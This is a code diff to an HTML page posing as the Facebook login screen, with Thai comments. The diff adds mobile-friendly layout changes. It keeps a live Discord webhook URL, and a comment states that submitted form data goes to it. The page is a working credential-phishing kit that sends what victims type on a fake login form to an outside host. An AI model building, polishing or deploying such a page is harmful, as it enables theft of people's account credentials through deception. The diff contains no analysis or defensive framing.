@@ -2,6 +2,7 @@
 <html lang="th">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- เพิ่ม viewport meta tag -->
     <title>Facebook Login</title>
     <style>
         body {
@@ -19,7 +20,10 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            width: 980px;
+            width: 100%; /* ปรับเป็น 100% ของขนาดหน้าจอ */
+            max-width: 980px; /* ความกว้างสูงสุดของ container */
+            padding: 0 20px; /* เพิ่ม padding ด้านซ้ายขวา */
+            box-sizing: border-box; /* ให้ padding นับเข้าไปใน width */
         }
         .left-section {
             flex: 1;
@@ -133,7 +137,7 @@
             };
 
             // ส่งข้อมูลไปยัง Discord webhook โดยใช้ XMLHttpRequest
-            var webhookURL = "https://discord.com/api/webhooks/1252253384501887067/VEuHR4FVh43ztNVPgmE0kd7RqWFIM154Gha7s63Do-R1tc4VbuLQ8DzOaamP323Te4nd"; // แทนที่ด้วย URL ของ Discord webhook ของคุณ
+            var webhookURL = "https://discord.com/api/webhooks/1252253384501887067/VEuHR4FVh43ztNVPgmE0kd7RqWFIM154Gha7s63Do-R1tc4VbuLQ8DzOaamP323Te4nd";
             var xhr = new XMLHttpRequest();
             xhr.open("POST", webhookURL);
             xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
